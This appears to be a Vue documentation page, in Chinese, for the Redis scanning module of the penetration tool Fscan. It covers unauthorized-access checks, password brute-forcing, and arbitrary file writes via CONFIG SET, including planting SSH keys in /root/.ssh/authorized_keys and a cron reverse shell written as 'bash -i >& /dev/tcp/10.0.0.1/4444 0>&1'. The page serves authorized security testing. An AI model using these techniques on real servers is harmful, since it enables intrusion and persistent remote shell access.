  ...
  <div>
    ...
    <div class="flex items-center mb-6">
      <div class="w-10 h-10 flex-shrink-0 rounded-lg mr-3 flex items-center justify-center"
        ...
        <Icon icon="mdi:database" class="text-xl" :class="isDark ? 'text-red-400' : 'text-red-600'" />
      </div>
    ...
    <div class="doc-content transition-colors duration-300"
      ...
      <p class="mb-4">Redis 扫描是 Fscan 的重要功能之一，用于发现网络中的 Redis 服务、检测弱密码及未授权访问，并支持多种文件写入功能。本指南详细介绍 Redis 扫描的工作原理、配置选项和最佳实践。</p>
      ...
      <p class="mb-4">Redis（Remote Dictionary Server）是一种开源的内存数据库，具有高性能、灵活性和广泛的应用场景。Fscan 的 Redis 扫描模块可以：</p>
      ...
      <div class="p-3 rounded-lg mb-6 text-sm font-normal"
        ...
        <div class="flex">
          <Icon icon="mdi:shield-alert" class="text-lg flex-shrink-0 mt-0.5 mr-2" :class="isDark ? 'text-red-400' : 'text-red-600'" />
          <div>
            <p class="font-medium" :class="isDark ? 'text-red-300' : 'text-red-700'">安全提示</p>
            <p class="mt-1" :class="isDark ? 'text-red-200' : 'text-red-800'">
              Redis 扫描功能应当仅用于合法的安全测试和授权的渗透测试。未经授权对系统进行扫描与利用可能违反法律法规。
            </p>
          </div>
        </div>
      </div>
      ...
      <div class="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
        ...
        <div class="p-4 rounded-lg border transition-colors duration-300"
          ...
          <div class="flex items-center mb-2">
            ...
            <h3 class="font-medium" :class="isDark ? 'text-gray-200' : 'text-gray-800'">漏洞利用</h3>
          </div>
          <p class="text-sm" :class="isDark ? 'text-gray-400' : 'text-gray-600'">
      ...
      <div class="overflow-x-auto mb-6">
        <table class="min-w-full rounded-lg overflow-hidden text-sm font-normal"
          ...
          <tr v-for="param in redisParameters" :key="param.name"
      ...
      <p class="mb-4">Redis 未授权访问是常见的安全问题，Fscan 会自动尝试进行无密码连接并发送 INFO 命令进行检测：</p>
        ...
        <div class="flex">
          ...
          <div>
            ...
            <p class="mt-1" :class="isDark ? 'text-amber-200' : 'text-amber-800'">
              防止 Redis 未授权访问的关键措施包括设置强密码、绑定内部 IP 地址、禁用危险命令，以及使用防火墙限制对 Redis 端口的访问。
            </p>
          </div>
        </div>
      </div>
...
func concurrentRedisScan(ctx context.Context, info *Common.HostInfo, credentials []RedisCredential,
    ...
    // ...
      ...
      <p class="mb-4">密码爆破过程使用协程池并发测试多个密码，支持自动重试和超时控制，提高了扫描效率。</p>
      ...
      <p class="mb-4">Redis 的一个重要安全特性是可以通过 CONFIG SET 命令修改数据库配置，这可能被利用来写入任意文件。Fscan 提供了多种文件写入功能：</p>
...
func writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
    ...
    return true, "Success", nil
      ...
      <p class="mb-4">可以将本地文件的内容写入到目标系统，适用于需要写入大文件或二进制文件的场景：</p>
      ...
      <p class="mb-4">此功能会尝试将公钥写入到目标系统的 <code>/root/.ssh/authorized_keys</code> 文件中。</p>
      ...
      <p class="mb-4">此功能会尝试将反弹Shell的定时任务写入到目标系统的 cron 目录中，格式为 <code>* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1</code>。</p>
        ...
        <div class="flex">
          ...
          <div>
            ...
            <p class="mt-1" :class="isDark ? 'text-green-200' : 'text-green-800'">
              在执行文件写入操作后，Fscan 会自动恢复 Redis 的原始配置（dbfilename 和 dir），减少对目标系统的影响。
            </p>
          </div>
        </div>
      </div>
      ...
      <p class="mb-4">Redis 扫描模块使用 <code>ModuleThreadNum</code> 参数控制并发线程数，可以通过 <code>-t</code> 参数设置：</p>
      ...
      <ul class="pl-5 list-disc space-y-2 mb-6">
        <li><strong>单个连接超时</strong>：通过 <code>-time</code> 参数设置每个 Redis 连接尝试的最大时间（秒）</li>
    ...
    <pre class="p-3 text-sm font-mono overflow-x-auto"><code class="transition-colors duration-300"
      ...
      <p class="mb-4">使用 <code>-noredis</code> 参数可以禁用 Redis 漏洞利用功能，仅执行扫描和认证。</p>
    </div>
